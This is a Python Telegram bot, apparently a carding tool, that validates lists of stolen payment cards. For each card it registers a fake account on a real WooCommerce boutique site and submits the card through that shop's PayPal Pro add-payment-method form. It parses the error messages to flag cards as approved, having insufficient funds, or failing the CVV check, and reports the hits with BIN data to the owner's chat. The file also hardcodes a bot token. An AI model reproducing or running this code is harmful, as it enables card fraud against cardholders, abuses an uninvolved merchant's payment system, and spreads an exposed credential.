import os,sys
import random
import telebot
import requests,random,time,string,base64
from bs4 import BeautifulSoup
import os,json
import base64
from telebot import types
import time,requests
from re import findall
import user_agent
from faker import Faker

user = user_agent.generate_user_agent()

print(user)




import random
import string
import threading
import time

acc = None  # تعريف متغير global لتخزين قيمة acc
zip_code = None  # تعريف متغير global لتخزين قيمة zip_code
street_address = None  # تعريف متغير global لتخزين قيمة street_address

def generate_random_account():
    global acc
    while True:
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=4))
        acc = f"{name}{number}@gmail.com"
        time.sleep(0.1)

def generate_zip_codes_periodically():
    global zip_code
    fake = Faker()
    while True:
        zip_code = fake.zipcode()
#        print(zip_code)
        time.sleep(0.5)

def generate_street_addresses_periodically():
    global street_address
    fake = Faker()
    while True:
        street_address = fake.street_address()
#        print(street_address)
        time.sleep(0.5)

# إنشاء مواضيع لتشغيل الدوال
thread_account = threading.Thread(target=generate_random_account)
thread_zip = threading.Thread(target=generate_zip_codes_periodically)
thread_street = threading.Thread(target=generate_street_addresses_periodically)

thread_account.start()
thread_zip.start()
thread_street.start()

# تأكد من تنفيذ باقي الكود بعد توليد الحسابات والرموز البريدية بشكل دوري
time.sleep(1)  # لإعطاء بعض الوقت لتحديث acc و zip_code






def  binn(bin,c,re):
	binn = requests.get(f'https://bins.antipublic.cc/bins/{bin[:6]}')
	if 'Invalid BIN' in binn.text or 'not found.' in binn.text or 'Error code 521' in binn.text or 'cloudflare' in binn.text:
		binnn = 'None'
		brand = 'None'
		country = 'None'
		country_name = 'None'
		country_flag = 'None'
		country_currencies = 'None'
		bank = 'None'
		level = 'None'
		type = 'None'
	else:
		js = binn. json()
		binnn = js['bin']
		brand = js['brand']
		country = js['country']
		country_name = js['country_name']
		country_flag = js['country_flag']
		country_currencies = js['country_currencies'][0]
		bank = js['bank']
		level = js['level']
		type = js['type']
		return f"""*ア 𝘾𝘾 -» <code>{c}</code>
カ 𝙎𝙩𝙖𝙩𝙪𝙨 -» <strong>Online</strong> ✅
零 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» {re}
カ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -» Paypal Auth
キ 𝘽𝙞𝙣 -» <code>{type} - {brand} - {level}</code>
朱 𝘽𝙖𝙣𝙠 -» <code>{bank}</code>
零 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» <code>{country_name} {country_flag} {country_currencies}</code>

ᥫ᭡ 𝙗𝙤𝙩 @hhhh4x"""


onwer = 6707467876
token = "7386560621:AAE4fO0clJA0l86iKr9Gyt63fayiXzEF-2U"


bot = telebot.TeleBot(token)





@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id == onwer:
        idd = message.from_user.id
        first = message.from_user.first_name
        last = message.from_user.last_name
        if "None" in str(last):
            last = ""
        url = f"tg://user?id={idd}"
        bot.reply_to(message,f"Hello Pro Bot\nPlease Send Cc List",parse_mode="markdown")



@bot.message_handler(content_types=['document'])
def send_file(message):
	session = requests.Session()
	bad=0
	ccn=0
	cvv=0
	app=0
	nc=0
	try:
		file_input = bot.download_file(bot.get_file(message.document.file_id).file_path)
		with open(f"{message.document.file_name}", 'wb') as f:
			f.write(file_input)
	except:
		bot.reply_to(message, text='Error Cc List')
	key = types.InlineKeyboardMarkup(row_width=1)
	af = types.InlineKeyboardButton('OWNAR', url='https://t.me/hhhh4x')
	key.add(af)
	cou = len(open(f"{message.document.file_name}","r").read().splitlines())
	idmss=bot.reply_to(message, text=f'Done Read Files Count: {cou}',reply_markup=key)
	
	
	

	for g in open(f"{message.document.file_name}","r").read().splitlines():
		nc+=1
		c = g.strip().split('\n')[0]
		cc = c.split('|')[0]
		exp=c.split('|')[1]
		ex=c.split('|')[2]
		try:
			exy=ex[2]+ex[3]
			if '2' in ex[3] or '1' in ex[3]:
				exy=ex[2]+'7'
			else:pass
		except:
			exy=ex[0]+ex[1]
			if '2' in ex[1] or '1' in ex[1]:
				exy=ex[0]+'7'
			else:pass
		cvc=c.split('|')[3]


		r=requests.session()
		import re
		heaf={
'User-Agent': user,
}
		get=r.get("https://delamorfabboutique.com/my-account/payment-methods/",headers=heaf)
		login=re.findall(r'name="woocommerce-register-nonce" value="(.*?)"',get.text)[0]


		time.sleep(2)


		headers = {
'User-Agent': user,
}


		data = {
    'email': acc,
    'password': acc,
    'woocommerce-register-nonce': login,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'register': 'Register',
}


		response = r.post('https://delamorfabboutique.com/my-account/payment-methods/', headers=headers, data=data)

		time.sleep(2)
		
		
		

		heaf={
'User-Agent': user,
}
		rrr=r.get("https://delamorfabboutique.com/my-account/add-payment-method/",headers=heaf)
		nonce=findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',rrr.text)[0]
		
		time.sleep(2)
		
		headers = {
'User-Agent': user,
}

		data = {
    'payment_method': 'paypal_pro',
    'paypal_pro-card-number': cc,
    'paypal_pro_card_expiration_month': exp,
    'paypal_pro_card_expiration_year': exy,
    'paypal_pro-card-cvc': cvc,
    'woocommerce-add-payment-method-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

		response = r.post('https://delamorfabboutique.com/my-account/add-payment-method/', headers=headers, data=data)

		soup = BeautifulSoup(response.text, 'html.parser')
		try:
			try:
				msg = soup.find('ul', class_='woocommerce-error').text.strip().split(":")[1]
				bad+=1
				color="\033[1;31m"
			except:
				msg = soup.find('ul', class_='woocommerce-error').text.strip()
		except:
			msg = response.text
			color="\033[1;31m"
		if 'CVV2' in msg:
			re="Declined CVV ❎"
			msg="Declined CVV ❎"
			color='\033[1;32m'
			ccn+=1
			mjj=binn(cc,c,re)
			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
		if 'Funds' in msg:
			re="Insufficient Funds. ✅"
			msg="Insufficient Funds. ✅"
			color='\033[1;32m'
			cvv+=1
			mjj=binn(cc,c,re)
			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
		if 'Payment method successfully added.' in msg or 'street address.' in msg or 'Gateway Rejected: avs' in msg or "Status code avs: Gateway Rejected: avs" in msg or "payment method added:" in msg or "Duplicate card exists in the vault." in msg or "Payment method successfully added." in msg:
			app+=1
			msg="Approved ✅"
			re="Approved. ✅"
			color='\033[1;32m'
			mjj=binn(cc,c,re)
			bot.send_message(message.chat.id,f"{mjj}",parse_mode='html')
		
		
		key = types.InlineKeyboardMarkup(row_width=1)
		ccli = types.InlineKeyboardButton(f" {g} ☢", callback_data="cclist")
		ccnn = types.InlineKeyboardButton(f" ccn good : {ccn} ❎", callback_data="cvv")
		cvvv = types.InlineKeyboardButton(f" cvv good : {cvv} ❎", callback_data="cvv")
		ap = types.InlineKeyboardButton(f" approved : {app} ✅", callback_data="aproved")
		badd = types.InlineKeyboardButton(f" stauts : {msg} ❕", callback_data="baad")
		nch = types.InlineKeyboardButton(f" num chk : {nc} 💱", callback_data="chk")
		own = types.InlineKeyboardButton(f"OWNAR", url="https://t.me/hhhh4x")
		key.add(ccli,badd,nch,ap,ccnn, cvvv,own )
		bot.edit_message_text(chat_id=message.chat.id, message_id=idmss.message_id,text="Checker Run ✔", reply_markup=key)
		print(msg)
		time.sleep(2)
		
bot.polling()


# account hussein